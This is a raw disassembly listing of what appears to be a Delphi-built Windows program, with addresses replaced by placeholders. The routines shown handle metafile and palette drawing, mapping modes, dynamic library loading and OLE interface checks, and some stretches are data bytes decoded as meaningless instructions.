mov eax [ ebx + 0x1c ]
call sub_42072c
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_42072c
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_42072c
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405928
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_4636ac
call sub_4611a0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_462734
sub_462d80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462dcf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
mov ecx r-xdata
call sub_40596c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_462734
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462dd6
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_462dec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4626a8
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_462e28
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4229e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_462e96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_42336c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462e9d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
sub_462ea1
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_462f59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_426f30
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_426f64
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032e8
retn
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_42333c
call sub_4271b4
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_423354
call sub_423d84
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423af8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_463069
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423754
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42376c
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237c4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46303d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_420f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463044
mov eax [ ebp - 0x18 ]
call sub_4032e8
retn
mov eax [ ebp - 0x8 ]
call sub_405928
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_4636c8
call sub_4611a0
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_462734
sub_463044
mov eax [ ebp - 0x10 ]
call sub_424914
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032e8
retn
sub_4630fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417b14
pop esi
pop ebx
retn
lea eax [ ebx + 0x28 ]
mov edx [ esi + 0x28 ]
call sub_405940
pop esi
pop ebx
retn
sub_463134
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4210c0
xor eax eax
push ebp
push sub_463232
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42146c
mov edi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp [ ebp - 0xc ] 0x4
jne r-xdata
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
mov [ ebp - 0x8 ] eax
push edi
call RealizePalette
mov [ ebp - 0x9 ] 0x1
push esi
mov eax ebx
call sub_4632e4
neg eax
push eax
mov eax ebx
call sub_463300
push eax
mov eax ebx
call sub_4632e4
dec eax
push eax
push 0x0
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
sub eax [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_4611a0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
push esi
mov eax [ ebp - 0x10 ]
push eax
push edi
call PlayEnhMetaFile
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_421364
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_463240
push ebx
push ecx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov al 0x1
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ebx
retn
sub_46326c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
push 0x0
call GetDC
mov esi eax
push 0x3
push esi
call SetMapMode
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
neg [ ebx + 0x4 ]
push 0x1
push ebx
push esi
call LPtoDP
push esi
push 0x0
call ReleaseDC
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4632b4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4632e4
mov edx eax
lea ecx [ esp + 0x8 ]
xor eax eax
call sub_416114
lea eax [ esp + 0x8 ]
mov edx esp
call sub_46326c
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4632e4
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_463300
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_46331c
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov edx [ esp ]
sub_463338
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
test [ esp ] 0x2
setne dl
sub_463358
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_463300
lea ecx [ esp + 0x8 ]
xor edx edx
call sub_416114
lea eax [ esp + 0x8 ]
mov edx esp
call sub_46326c
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46339c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4633da
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x4 ]
call sub_463384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4633e1
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4633e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_4611a0
sub_463404
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_463442
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x4 ]
call sub_463384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463449
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_463450
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
lea eax [ ebx + 0x28 ]
call sub_405928
push eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db90
test eax eax
je r-xdata
or ecx 0xffffffff
xor edx edx
call sub_4636f0
call sub_4611a0
pop esi
pop ebx
retn
sub eax 0xffffffec
sub_46348d
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463507
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db90
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x28 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_4611a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46350e
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub eax 0xffffffec
sub_463513
add [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_463563
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x4 ]
call sub_463384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46356a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_463570
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4635af
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x4 ]
call sub_463384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4635b6
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4635bc
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d258
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4636c8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call [ rw-data ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4636f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40599c
xor eax eax
push ebp
push sub_46374f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x8000ffff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463756
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_463760
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4637b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4637bc
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x10
mov eax [ rw-data ]
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4637e4
push 0xe1004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_463849
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463850
retn
sub_4638a4
test [ eax ] edi
inc esi
add [ edi - 0x66ffb9c8 ] cl
cmp [ esi ] al
pop ebp
cmp [ esi ] al
cmp [ bp ] al
jno r-xdata
inc esi
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] cl
inc esi
add al al
cmp [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
cmp [ esi ] eax
or al 0x0
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ esi ] cl
push esp
inc ebp
jbe r-xdata
inc esi
add [ ebx + 0x38 ] bh
inc esi
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
movsb [ edi ] [ esi ]
cmp [ esi ] al
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
movsb [ edi ] [ esi ]
cmp [ esi ] al
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
cmp [ esi ] eax
sar [ eax ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] cl
inc esi
add [ eax + eax ] cl
add [ esp + 0x4 ] 0xfffffdb0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xe0 ]
outsb
je r-xdata
add al 0xb4
std
imul esi [ ebx + 0x70 ] 0x68637461
nop
int3
sub_464037
inc edi
inc ecx
add [ eax ] dh
add al [ eax ]
add [ edx ] cl
add [ eax + eax ] dl
verw [ ebx ]
mov al 0xd
mov al 0xc
mov al 0xe
mov al 0x5
mov al 0x29
mov al 0x2a
mov al 0xd1
dec [ ecx ]
inc esi
add [ ecx ] ch
inc esi
add [ ecx + 0x61f80046 ] bl
inc esi
add [ edx + 0x46 ] bh
add [ eax ] cl
arpl [ esi ] ax
or [ esi + eax * 2 ] ah
shl [ esi + eax * 2 ] 0x10
inc esi
add [ eax ] dl
push ebp
inc esi
add [ ebx ] cl
push esp
dec edi
insb
inc ebx
outsd
outsb
je r-xdata
retn
outsd
insb
mov [ eax + 0x46 ] es
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc ebx
outsd
outsb
je r-xdata
xor eax eax
push ebp
push sub_464159
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_412da8
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_40596c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4625f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464160
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x4 ]
call sub_405928
retn
outsd
insb
sbb [ edi ] bh
inc esi
add al ah
retn 0x43
sub_4640b0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_4640ee
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_4625a0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4131e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4640f5
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_4640fc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464159
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_412da8
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_40596c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4625f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464160
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_464178
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40edb8
mov eax esi
call sub_404e34
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
pop esi
pop ebx
retn
sub_4641bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x208 ]
add eax 0x10
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_40339c
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_46427c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi 0xfffffda1
jl r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
cmp esi 0xfffffda8
jg r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x24
sub_4642c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4421c4
or [ ebx + 0x24 ] 0x2
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax [ ebx + 0x208 ]
inc [ eax + 0x48 ]
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x34 ] 0x0
jle r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x3c ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ ebx + 0x240 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x34 ]
mov eax esi
call sub_417710
mov eax [ ebx + 0x240 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464198
mov [ ebx + 0x210 ] eax
mov eax ebx
call sub_464938
mov edx [ ebx + 0x218 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea eax [ ebx + 0x23c ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x58 ]
call sub_4611a0
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ ebx + 0x244 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x3c ]
mov eax esi
call sub_417710
mov eax [ ebx + 0x244 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
lea eax [ ebx + 0x21c ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4611a0
test [ ebx + 0x23d ] 0x4
je r-xdata
test [ ebx + 0x23e ] 0x2
jne r-xdata
inc edi
xor esi esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov ecx eax
mov eax [ ebx + 0x240 ]
mov edx esi
call sub_417664
inc esi
dec edi
jne r-xdata
test [ ebx + 0x23e ] 0x1
je r-xdata
xor edx edx
mov eax ebx
call sub_43fbd0
mov eax ebx
test eax eax
je r-xdata
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42321c
mov ecx eax
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_417664
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_417570
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_465560
inc esi
dec edi
jne r-xdata
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
push eax
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4611a0
sub eax 0xfffffd9c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
test [ ebx + 0x23d ] 0x60
sete dl
mov eax ebx
call sub_446704
push ebx
call sub_46660c
call sub_4611a0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4644f8
push ebx
push esi
push edi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi ]
call sub_4032e8
xor eax eax
mov [ esi ] eax
inc ebx
xor edi edi
mov eax [ esi ]
mov edx edi
call sub_417570
call sub_4032e8
inc edi
dec ebx
jne r-xdata
sub_464530
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_465c30
cmp [ esi + 0x218 ] 0x0
je r-xdata
mov eax esi
call sub_464d50
mov eax esi
call sub_464df8
lea eax [ esi + 0x21c ]
call sub_405928
cmp [ esi + 0x218 ] 0x0
je r-xdata
push 0x1
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ esi + 0x218 ]
call sub_405928
mov eax [ esi + 0x210 ]
call sub_4032e8
lea eax [ esi + 0x240 ]
call sub_4644f8
lea eax [ esi + 0x244 ]
call sub_4644f8
mov eax [ esi + 0x208 ]
dec [ eax + 0x48 ]
mov eax [ esi + 0x208 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
push 0x0
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4422e8
test bl bl
jle r-xdata
mov eax esi
call sub_464db8
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4645f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464890
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464897
lea eax [ ebp - 0xc ]
call sub_405928
lea eax [ ebp - 0x8 ]
call sub_405928
retn
xor eax eax
push ebp
push j_sub_403788#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403788#6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_405928
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4611a0
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x214 ]
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405928
push eax
push 0x0
push ebx
call CreateStreamOnHGlobal
call sub_4611a0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
